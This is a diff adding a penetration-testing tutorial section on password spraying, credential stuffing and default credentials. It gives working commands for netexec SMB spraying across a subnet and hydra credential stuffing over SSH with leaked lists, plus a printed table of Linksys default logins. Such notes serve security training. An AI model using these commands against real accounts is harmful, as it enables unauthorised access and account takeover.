@@ -1,3 +1,53 @@
+# Spraying, Stuffing, and Defaults
+
+## Password Spraying
+
+[Password spraying](https://owasp.org/www-community/attacks/Password_Spraying_Attack) is a type of brute-force attack in which an attacker attempts to use a single password across many different user accounts.
+
+Depending on the target system, different tools may be used to carry out password spraying attacks. For web applications, [Burp Suite](https://portswigger.net/burp) is a strong option, while for Active Directory environments, tools such as [NetExec](https://github.com/Pennyw0rth/NetExec) or [Kerbrute](https://github.com/ropnop/kerbrute) are commonly used.
+
+```bash
+$ netexec smb 10.100.38.0/24 -u <usernames.list> -p 'ChangeMe123!'
+```
+
+## Credential Stuffing
+
+[Credential stuffing](https://owasp.org/www-community/attacks/Credential_stuffing) is another type of brute-force attack in which an attacker uses stolen credentials from one service to attempt access on others. Since many users reuse their usernames and passwords across multiple platforms (such as email, social media, and enterprise systems), these attacks are sometimes successful.
+
+For example, if we have a list of `username:password` credentials obtained from a database leak, we can use `hydra` to perform a credential stuffing attack against an SSH service using the following syntax:
+
+```bash
+$ hydra -C user_pass.list ssh://10.100.38.23
+```
+
+## Default Credentials
+
+While several lists of known default credentials are available online, there are also dedicated tools that automate the process. One widely used example is the [Default Credentials Cheat Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet), which we can install with `pip3`.
+
+```bash
+$ pip3 install defaultcreds-cheat-sheet
+```
+
+```bash
+$ creds search linksys
+
++---------------+---------------+------------+
+| Product       |    username   |  password  |
++---------------+---------------+------------+
+| linksys       |    <blank>    |  <blank>   |
+| linksys       |    <blank>    |   admin    |
+| linksys       |    <blank>    | epicrouter |
+| linksys       | Administrator |   admin    |
+| linksys       |     admin     |  <blank>   |
+| linksys (ssh) |     admin     |   admin    |
+| linksys (ssh) |     admin     |  password  |
+| linksys (ssh) |    linksys    |  <blank>   |
+| linksys (ssh) |      root     |   admin    |
++---------------+---------------+------------+
+```
+
+Beyond applications, default credentials are also commonly associated with routers. One such list is available [here](https://www.softwaretestinghelp.com/default-router-username-and-password-list/). While it is less likely that router credentials remain unchanged (since these devices are critical to network security), oversights do occur.
+
 # Attacking LSASS
 
 Upon initial logon, LSASS will:
